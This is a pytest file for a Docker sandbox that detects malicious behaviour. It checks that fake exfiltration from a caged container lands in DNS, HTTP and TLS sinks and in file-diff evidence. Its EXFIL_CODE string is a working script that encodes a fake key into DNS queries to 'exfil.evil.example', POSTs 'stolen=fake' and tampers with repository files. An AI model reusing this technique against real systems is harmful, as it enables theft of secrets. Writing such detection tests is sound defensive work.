"""Day 2 gate: fake exfil from the cage must land in the sinks, logs and trace."""

from pathlib import Path

import docker
import pytest

from run.evidence import State
from run.sandbox import SCAN_LABEL, Sandbox, SandboxConfig

pytestmark = pytest.mark.docker
PYTHON_IMAGE = "python:3.12-alpine"

EXFIL_CODE = r"""
import base64, http.client, pathlib, socket, ssl, sys
dns_ip, http_ip = sys.argv[1], sys.argv[2]
label = base64.b32encode(b"AKIA-FAKE-SECRET").decode().rstrip("=")
name = label + ".exfil.evil.example"
query = bytes.fromhex("abcd01000001000000000000")
query += b"".join(bytes([len(part)]) + part.encode() for part in name.split("."))
query += b"\x00\x00\x01\x00\x01"
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(5)
sock.sendto(query, (dns_ip, 53))
assert sock.recvfrom(4096)[0][-4:] == socket.inet_aton(http_ip)
sock.close()
conn = http.client.HTTPConnection(http_ip, 80, timeout=5)
conn.request("POST", "/collect", body="stolen=fake")
assert conn.getresponse().status == 200
conn.close()
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE
with socket.create_connection((http_ip, 443), timeout=5) as raw:
    try:
        context.wrap_socket(raw, server_hostname="tls.evil.example")
    except (ssl.SSLError, OSError):
        pass  # the sink logs the ClientHello and never completes the handshake
pathlib.Path("/repo/pwned.txt").write_text("cage was here\n")
readme = pathlib.Path("/repo/README.md")
readme.write_text(readme.read_text() + "modified\n")
print("EXFIL_DONE")
"""

LOCK_CODE = r"""
import os, pathlib
locked = pathlib.Path("/repo/locked")
(locked / "deep").mkdir(parents=True)
(locked / "a.txt").write_text("x")
(locked / "deep" / "b.txt").write_text("y")
os.chmod(locked / "deep", 0)
os.chmod(locked, 0)
print("LOCKED")
"""


@pytest.fixture
def engine():
    client = docker.from_env(timeout=5)
    try:
        client.ping()
        for image in ("alpine:3.20", PYTHON_IMAGE):
            client.images.get(image)
        yield client
    finally:
        client.close()


def assert_no_leftovers(engine, evidence) -> None:
    assert not engine.containers.list(
        all=True, filters={"label": f"{SCAN_LABEL}={evidence.scan_id}"}
    )
    assert not engine.networks.list(filters={"label": f"{SCAN_LABEL}={evidence.scan_id}"})


def test_fake_exfil_hits_all_sinks_and_is_traced(repo: Path, engine):
    sandbox = Sandbox(repo, SandboxConfig(image=PYTHON_IMAGE))
    with sandbox:
        sandbox.start_sinks()
        assert sandbox.trace_before()
        result = sandbox.run_command(["python", "-c", EXFIL_CODE, sandbox.dns_ip, sandbox.http_ip])
        assert result.exit_code == 0, result.model_dump_json()
        assert result.stdout == "EXFIL_DONE\n"
        sandbox.collect_sinks()
        sandbox.trace_after()
    evidence = sandbox.evidence
    assert not evidence.errors
    assert evidence.status == "incomplete"
    components = evidence.components
    assert components.sandbox == State.COMPLETE
    assert components.dns_sink == State.COMPLETE
    assert components.http_sink == State.COMPLETE
    assert components.tls_sink == State.COMPLETE
    assert components.trace == State.COMPLETE
    assert components.decoy == State.NOT_RUN
    dns = next(hit for hit in evidence.dns_hits if "exfil.evil.example" in hit.destination)
    assert dns.source_ip == sandbox.cage_ip
    assert "AKIA-FAKE-SECRET" in dns.detail
    http = next(hit for hit in evidence.http_hits if "stolen=fake" in hit.detail)
    assert http.source_ip == sandbox.cage_ip
    assert http.destination.endswith("/collect")
    tls = evidence.tls_hits[-1]
    assert tls.destination == "tls.evil.example"
    assert tls.source_ip == sandbox.cage_ip
    changes = {(item.path, item.change) for item in evidence.file_diffs}
    assert ("pwned.txt", "added") in changes
    assert ("README.md", "modified") in changes
    assert (repo / "README.md").read_text() == "A benign fixture.\n"
    assert not (repo / "pwned.txt").exists()
    assert not sandbox.staged_path.parent.exists()
    assert_no_leftovers(engine, evidence)


def test_cage_locked_directories_still_clean_up(repo: Path, engine):
    sandbox = Sandbox(repo, SandboxConfig(image=PYTHON_IMAGE))
    with sandbox:
        sandbox.start_sinks()
        assert sandbox.trace_before()
        result = sandbox.run_command(["python", "-c", LOCK_CODE])
        assert result.exit_code == 0, result.model_dump_json()
        sandbox.collect_sinks()
        sandbox.trace_after()
    assert not sandbox.evidence.errors
    assert sandbox.evidence.components.trace == State.COMPLETE
    changes = {(item.path, item.change) for item in sandbox.evidence.file_diffs}
    assert ("locked", "added") in changes
    assert not sandbox.staged_path.parent.exists()
    assert_no_leftovers(engine, sandbox.evidence)


RESOLVE_CODE = r"""
import http.client, socket, sys
http_ip = sys.argv[1]
addresses = {
    info[4][0]
    for info in socket.getaddrinfo("x.evil.example", 80, type=socket.SOCK_STREAM)
}
assert addresses == {http_ip}, addresses
conn = http.client.HTTPConnection("x.evil.example", 80, timeout=5)
conn.request("GET", "/by-name")
assert conn.getresponse().status == 200
conn.close()
print("RESOLVED")
"""


def test_cage_resolver_gets_the_sink_address_and_connects_by_hostname(repo: Path, engine):
    sandbox = Sandbox(repo, SandboxConfig(image=PYTHON_IMAGE))
    with sandbox:
        sandbox.start_sinks()
        result = sandbox.run_command(["python", "-c", RESOLVE_CODE, sandbox.http_ip])
        assert result.exit_code == 0, result.model_dump_json()
        assert result.stdout == "RESOLVED\n"
        sandbox.collect_sinks()
    assert not sandbox.evidence.errors
    components = sandbox.evidence.components
    assert components.sandbox == State.COMPLETE
    assert components.dns_sink == State.COMPLETE
    assert components.http_sink == State.COMPLETE
    assert components.tls_sink == State.COMPLETE
    assert any("x.evil.example" in hit.destination for hit in sandbox.evidence.dns_hits)
    http = next(hit for hit in sandbox.evidence.http_hits if hit.destination.endswith("/by-name"))
    assert http.destination == "x.evil.example/by-name"
    assert http.source_ip == sandbox.cage_ip
    assert_no_leftovers(engine, sandbox.evidence)
